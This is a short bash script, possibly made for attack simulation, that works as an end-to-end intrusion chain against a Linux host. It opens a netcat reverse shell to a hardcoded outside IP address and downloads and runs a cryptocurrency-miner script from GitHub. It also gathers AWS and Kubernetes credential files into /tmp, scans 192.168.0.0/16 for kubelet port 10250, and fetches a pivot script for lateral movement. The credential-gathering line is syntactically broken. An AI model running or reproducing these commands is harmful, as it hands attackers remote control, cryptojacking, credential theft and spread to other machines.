#!/usr/bin/env bash
apt-get install -y netcat-traditional python3 python3-requests masscan
# reverse shell
nc 205.134.240.43 8001 -e /bin/bash &
# xmrig
wget https://raw.githubusercontent.com/uptycs-nhegde/super-benign-scripts/master/xmrig_final.py -O run.py
python3 run.py &
# extract credentials
find / -print | grep -iE 'aws|kubernetes' exec cat {} > /tmp/creds_dump
# scan for other hosts
masscan -p10250 192.168.0.0/16 --rate=1000 > /tmp/out
cat /tmp/out | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | sort -u > ips.txt
wget https://raw.githubusercontent.com/uptycs-nhegde/super-benign-scripts/master/pivot.py -O pivot.py
python3 pivot.py ips.txt > pivot.txt
